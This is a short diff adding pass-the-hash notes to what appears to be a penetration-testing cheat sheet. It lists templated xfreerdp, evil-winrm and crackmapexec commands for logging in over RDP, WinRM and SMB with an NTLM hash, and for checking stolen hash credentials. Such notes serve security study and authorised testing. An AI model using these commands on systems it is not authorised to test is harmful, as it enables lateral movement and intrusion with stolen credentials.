@@ -17,3 +17,17 @@
 #
 #This kind of attack can be launched with other tools.
 # Is worth mention that this only can be achieve with a NTLM hash, which is not the same than a NTLMv2 hash. 
+#
+# !!!!!IMPORTANT¡¡¡¡¡¡¡¡
+#
+# it is also worth to mention that we can perfrom PtH attacks in other protocols like RDP or WinRM, we can check this kind of lateral movement vectors with xfreerdp and winrm respectively:
+
+xfreerdp /v:<IP> /u:<USER> /pth:<NTLMHASH>
+
+evil-winrm -i <IP> -u <USER> -H <NTLMHASH>
+
+# We don't have to be admin in order to be capable of login in this services with PtH technique.
+#
+# Also we can check if a user and his password hash are valid credentials with cme:
+
+crackmapexec <smb|winrm|rdp> <IP> -u <USER> -H <HASH>
